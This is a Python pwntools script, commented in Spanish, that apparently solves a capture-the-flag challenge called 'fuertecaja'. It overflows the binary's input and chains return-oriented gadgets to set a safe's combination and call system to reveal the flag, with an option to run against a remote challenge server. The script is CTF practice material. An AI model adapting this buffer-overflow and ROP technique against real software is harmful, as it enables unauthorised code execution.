from pwn import *
from itertools import product

# Establecemos el contexto a amd64:
context.arch = "amd64"

binary 	= ELF("./fuertecaja")

# ROP que nos permitirá poner el argumento de las
# combinaciones sobre rdi antes de cada "click":
pop_rdi	=	p64(0x0401653)

# Esta función es la que imprime "bingo" por pantalla,
# y establece la variable *0x40407c = 1;
abrecaja	=	p64(0x0401240)

# Las funciones siguientes hacen "click" y ponen, en
# el mismo orden que los parámetros pasados a system,
# el valor pasado como argumento como combinación.
#	click1	=	*0x404080 
#	click2	=	*0x404084
#	click3	=	*0x404088
#	click4	=	*0x40408c
#	click5	=	*0x404090
# En todas las rutinas hay esta lógica:
#if ((-1 < param_1) && (param_1 < 4)) {
#	*variable = param_1
#}
# Así, los diferentes valores solo pueden ser 0,1,2,3.
# 
combinations	=	[0,1, 2, 3]

click1	=	p64(0x04012a2)
click2	=	p64(0x040131c)
click3	=	p64(0x0401396)
click4	=	p64(0x0401410)
click5	=	p64(0x040148a)

# Esta función ejecuta system sobre el script de python que,
# si la combinación es correcta, nos mostrará la flag:
system	=	p64(0x0401504)

# Para controlar EIP directamente tras main y empezar
# la secuencia:
padding	=	b'A'*8
RBP		=	p64(0xcafebabe)

# main lee 0x18 bytes; comienzo de apertura de caja:
start		=	padding + RBP + abrecaja

# Finalmente, si la combinación es la buena, esta 
# llamada a  sym.imp.snprintf(uVar1, 0x1d, "%s %d %d %d %d %d %d", "~/caja_fuerte.py", *0x40407c, *0x404080, *0x404084, *0x404088 , *0x40408c, *0x404090);
# ejecutará el script en python del servidor local y nos dará la flag.
muestracaja	=	padding + RBP + p64(0x040101a) + system  + abrecaja 

# El payload básico siempre es el padding + RBP + pop_rdi:
payload	=	padding + RBP + pop_rdi

# Bucle principal con todas las posibles combinaciones de la caja fuerte:
#for c in product([0,1,2,3], repeat = 5):
for i in range(0,1):

	if args.REMOTE:
		io = remote("167.235.18.25",10011)
	else:
		if args.GDB:
			io = gdb.debug(binary.path)
		else:
			io = process(binary.path)

	# Empezamos la secuencia:
	io.sendafter("buscar?",start)
	# Todas las XX abajo en todas las comb:
	c = [1,3,2,0,0]
	# Todos las XX arriba en todas las comb:
	c = [2,0,1,3,3]
	# Alineados:
	c = [3,1,0,2,2]
	warning("Probando combinación: %s" , c)

	# Posibles combinaciones diferentes van aquí:
	c1	=	payload + p64(c[0]) + click1
	c2	=	payload + p64(c[1]) + click2
	c3	=	payload + p64(c[2]) + click3
	c4	=	payload + p64(c[3]) + click4
	c5	=	payload + p64(c[4]) + click5

	# Lanzamos el payload y establecemos las combinaciones para cada
	# dígito de la caja fuerte:
	info("Sending: %s", c1.hex())
	io.sendafter("abrirla",c1)
	info("Sending: %s", c2.hex())
	io.sendafter("Click",c2)
	info("Sending: %s", c3.hex())
	io.sendafter("Click",c3)
	info("Sending: %s", c4.hex())
	io.sendafter("Click",c4)
	info("Sending: %s", c5.hex())
	io.sendafter("Click",c5)

	# Vamos a ver si hay suerte y tenemos flag:
	warning("Vamos a ver si se ha abierto...")
	io.sendafter("Click",muestracaja) 
	data = b''
	for b in range(0,10):
		data += io.recvline()
	info(data)

	# Cerramos esta conexión y probamos de nuevo:
	io.close()
